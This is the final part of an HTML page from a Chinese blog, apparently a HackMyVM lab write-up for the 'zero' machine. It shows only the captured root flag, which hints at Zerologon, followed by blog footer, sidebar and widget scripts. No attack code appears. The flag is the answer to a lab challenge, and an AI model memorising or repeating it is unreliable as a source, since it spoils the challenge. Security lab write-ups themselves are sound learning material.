+HMV&#123;Z3r0_l0g0n_!s_Pr3tty_D4ng3r0u$&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/d39a3c59.html">https://drume2.github.io/posts/d39a3c59.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HMV/">HMV</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/22cb9a91.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/15.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Twisted</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/576162f9.html" title="HMV-Devoops"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-20</div><div class="title">HMV-Devoops</div></div></a></div><div><a href="/posts/22cb9a91.html" title="HMV-Twisted"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/15.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-22</div><div class="title">HMV-Twisted</div></div></a></div><div><a href="/posts/6244f084.html" title="HMV-Webmaster"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/13.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-21</div><div class="title">HMV-Webmaster</div></div></a></div><div><a href="/posts/b49ea5d6.html" title="HackMyVM Gigachad."><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/11.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-19</div><div class="title">HackMyVM Gigachad.</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HMV-zero"><span class="toc-number">1.</span> <span class="toc-text">HMV-zero</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#userflag"><span class="toc-number">1.2.</span> <span class="toc-text">userflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rootflag"><span class="toc-number">1.3.</span> <span class="toc-text">rootflag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/d39a3c59.html" title="HMV-zero"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-zero"/></a><div class="content"><a class="title" href="/posts/d39a3c59.html" title="HMV-zero">HMV-zero</a><time datetime="2025-06-23T11:12:33.000Z" title="发表于 2025-06-23 19:12:33">2025-06-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/22cb9a91.html" title="HMV-Twisted"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/15.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Twisted"/></a><div class="content"><a class="title" href="/posts/22cb9a91.html" title="HMV-Twisted">HMV-Twisted</a><time datetime="2025-06-22T12:44:37.000Z" title="发表于 2025-06-22 20:44:37">2025-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/6244f084.html" title="HMV-Webmaster"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/13.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Webmaster"/></a><div class="content"><a class="title" href="/posts/6244f084.html" title="HMV-Webmaster">HMV-Webmaster</a><time datetime="2025-06-21T14:36:25.000Z" title="发表于 2025-06-21 22:36:25">2025-06-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/576162f9.html" title="HMV-Devoops"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/16.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Devoops"/></a><div class="content"><a class="title" href="/posts/576162f9.html" title="HMV-Devoops">HMV-Devoops</a><time datetime="2025-06-20T13:06:57.000Z" title="发表于 2025-06-20 21:06:57">2025-06-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b49ea5d6.html" title="HackMyVM Gigachad."><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/11.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM Gigachad."/></a><div class="content"><a class="title" href="/posts/b49ea5d6.html" title="HackMyVM Gigachad.">HackMyVM Gigachad.</a><time datetime="2025-06-19T11:10:25.000Z" title="发表于 2025-06-19 19:10:25">2025-06-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Morii</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><<head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikooo-one.vercel.app/',
+      region: 'us-east-1',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo@1/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'BF23duYcvhYPZIqUHv6NigOn-MdYXbMMI',
+      appKey: 'Bb6SG97mQjBt3SKeopWEnnQU',
+      avatar: 'monsterid',
+      serverURLs: 'https://bf23duyc.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Twikoo' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer data-pjax type="text/javascript" src="https://npm.elemecdn.com/xianqi-hexo/js/animate.js"></script><div class="aplayer no-destroy" data-id="3485712867" data-server="tencent" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="auto" data-autoplay="false" muted></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script src="//code.tidio.co/null.js" async="async"></script><script>function onTidioChatApiReady() {
+  window.tidioChatApi.hide();
+  window.tidioChatApi.on("close", function() {
+    window.tidioChatApi.hide();
+  });
+}
+if (window.tidioChatApi) {
+  window.tidioChatApi.on("ready", onTidioChatApiReady);
+} else {
+  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
+}
+
+var chatBtnFn = () => {
+  document.getElementById("chat_btn").addEventListener("click", function(){
+    window.tidioChatApi.show();
+    window.tidioChatApi.open();
+  });
+}
+chatBtnFn()
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#posts-chart","#tags-chart","#categories-chart",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":160,"height":260},"mobile":{"show":false},"marked":{"prependRoot":true,"postAsset":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
